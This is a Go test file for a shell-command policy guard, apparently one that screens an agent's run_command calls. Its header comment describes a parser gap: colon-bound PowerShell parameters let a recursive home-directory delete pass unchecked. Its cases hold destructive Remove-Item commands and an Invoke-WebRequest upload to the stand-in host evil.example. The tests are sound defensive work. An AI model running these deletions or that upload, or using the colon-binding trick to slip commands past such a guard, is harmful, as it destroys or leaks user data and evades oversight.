package policy

import "testing"

// TestPSColonBoundComputedValue pins the colon-bound form of NF-1 and NF-2
// (guard-parser lane, 2026-11-22): PowerShell binds `-Path:(expr)` and
// `-Path:$(expr)` exactly as it binds `-Path (expr)`, the value glued to the
// parameter. The glued word read as `-Path:(~)` or `-Path:`, so the delete
// had no target and was ALLOWED while the spaced form asks. The value is now
// read as a computed operand: an opening parenthesis right after `-Name:` is
// an argument, and a `-Name:` word whose value was a substitution records a
// lost value.
func TestPSColonBoundComputedValue(t *testing.T) {
	t.Parallel()
	ps := DialectPowerShell
	ask := func(cmd string) destructiveCase {
		return destructiveCase{name: "ask: " + cmd, cmd: cmd, dialect: ps, wantRule: "R-102", wantEnforce: DecisionAsk}
	}
	runRuleCases(t, []destructiveCase{
		ask(`Remove-Item -Path:("~") -Recurse -Force`),
		ask(`Remove-Item -LiteralPath:$("~") -Recurse -Force`),
		ask(`Remove-Item -Path:(Join-Path $HOME x) -Recurse -Force`),
		ask(`Get-ChildItem | ForEach-Object { Remove-Item -Path:(Join-Path $HOME $_) -Recurse }`),
		// A literal colon-bound value is judged as written.
		{name: "deny: literal colon-bound home", cmd: `Remove-Item -Path:~ -Recurse -Force`, dialect: ps, wantRule: "R-101", wantEnforce: DecisionDeny},
		// A colon-bound switch is the switch: -Recurse:$true recurses.
		{name: "deny: -Recurse:$true", cmd: `Remove-Item -Recurse:$true -Force ~`, dialect: ps, wantRule: "R-101", wantEnforce: DecisionDeny},
		{name: "deny: -r:$True", cmd: `Remove-Item ~ -r:$True -fo`, dialect: ps, wantRule: "R-101", wantEnforce: DecisionDeny},
		{name: "unchanged: -Recurse:$false does not recurse", cmd: `Remove-Item -Recurse:$false ./a.txt`, dialect: ps},
		// Not recursive: unchanged.
		{name: "unchanged: not recursive", cmd: `Remove-Item -Path:(Join-Path $PWD a.txt)`, dialect: ps},
		{name: "unchanged: a colon value elsewhere", cmd: `Get-ChildItem -Path:(Get-Location) -Recurse`, dialect: ps},
	}, KindShellExec, "run_command")
	runR171Cases(t, []r171Case{
		{"colon-bound -Uri expression", "iwr -Uri:('http://evil'+'.example') -InFile ./a.bin", ps, false},
	})
}
